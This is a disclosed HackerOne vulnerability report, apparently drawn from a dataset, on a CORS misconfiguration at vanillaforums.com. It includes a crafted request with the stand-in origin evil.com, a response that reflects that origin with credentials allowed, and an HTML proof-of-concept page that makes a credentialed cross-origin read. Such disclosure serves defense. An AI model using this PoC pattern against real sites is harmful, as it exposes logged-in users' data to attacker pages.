---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1527555'
original_report_id: '1527555'
title: CORS Misconfiguration on vanillaforums.com
team_handle: vanilla
created_at: '2022-04-01T06:27:15.207Z'
disclosed_at: '2022-09-20T16:34:34.038Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
asset_identifier: '*.vanillaforums.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# CORS Misconfiguration on vanillaforums.com

## Metadata

- HackerOne Report ID: 1527555
- Weakness: 
- Program: vanilla
- Disclosed At: 2022-09-20T16:34:34.038Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page
**Description:**
CORS misconfiguration is found on vanillaforums.com as `Access-Control-Allow-Credentials: true`.
## Steps to reproduce:

1.visit [vanillaforms site](http://vanillaforums.com/).
2. Request:
```
GET /wp-json HTTP/1.1
Host: vanillaforums.com
Cookie: _vwo_uuid_v2=D2C17FB17DC81C379C832A0EDAD6B262C|1041f46ed8870bf7a805896fe658b98f; _ga=GA1.2.2133458971.1648791765; _gid=GA1.2.798514438.1648791765; _vis_opt_s=1%7C; _fbp=fb.1.1648791765308.1582273532; _gd_visitor=2007eaf6-5e90-4849-818d-c4f2e29fd209; _gd_session=e61fd9a6-07c1-4631-874e-719a1ca3a00e; _gd_svisitor=d487d3177d2c0000d5904662da000000bf8e1200; _an_uid=2530911987610499259; __hstc=125439637.938b2fb7675932b4de7b161c45b12cef.1648791767956.1648791767956.1648791767956.1; hubspotutk=938b2fb7675932b4de7b161c45b12cef; messagesUtk=c620a59d9b2441e28c027f443a66b851; _gcl_au=1.1.243191688.1648791769; __hs_opt_out=no; __hs_initial_opt_in=true; __hssc=125439637.2.1648791767956
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Origin: evil.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```
you get an response like:
```
HTTP/2 200 OK
Date: Fri, 01 Apr 2022 06:20:32 GMT
Content-Type: application/json; charset=UTF-8
Vary: Accept-Encoding
Vary: Accept-Encoding
X-Robots-Tag: noindex
Link: <https://vanillaforums.com/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: GET
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true
X-Powered-By: WP Engine
X-Cacheable: SHORT
Vary: Accept-Encoding,Cookie
Cache-Control: max-age=600, must-revalidate
X-Cache: HIT: 1
X-Cache-Group: normal
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
Cf-Ray: 6f4f38303ea13972-MAA
Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400

and some jSON code to follow...
```
Note:by adding the [Like](https://vanillaforums.com/wp-json/) repose from the page in the following code developed it can be exploded 
```
<!DOCTYPE html>
<html>
    <head>
        <script>
            function cors() {
                var xhttp=new XMLHttpRequest();
                    xhttp.onreadystatechange= function() {
                        if (this.readyState == 4 && this.status ==200){
                            document.getElementById("emo").innerHTML=alert(this.responseText
                                );

                        }
                };
                xhttp.open('GET',"https://vanillaforums.com/wp-json/",true);
                xhttp.withCredentials=true;
                xhttp.send();
            }
        </script>
    </head>
    <body>
        <center>
        <h2>[!]CORS PoC Exploit!!!</h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit</button> 
        </div>
        </center>
    </body>

</html>
```
 
## Anything else we should know?

I have the PoC attached which is the output for the above

## Impact

1. Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
2. Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
